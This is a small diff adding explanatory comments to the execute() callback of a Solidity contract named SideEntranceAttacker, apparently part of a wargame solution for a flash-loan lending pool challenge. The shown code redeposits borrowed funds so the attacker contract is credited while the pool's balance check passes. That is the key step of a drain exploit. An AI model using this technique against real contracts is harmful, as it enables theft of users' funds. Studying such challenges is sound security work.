@@ -37,6 +37,8 @@ contract SideEntranceAttacker {
 
     // called by ISideEntranceLenderPool::flashLoan
     function execute() external payable {
+        // deposit the tokens again, crediting the attacker contract
+        // and passing the flash loan balance check
         _pool.deposit{value: _poolBalance}();
     }
 
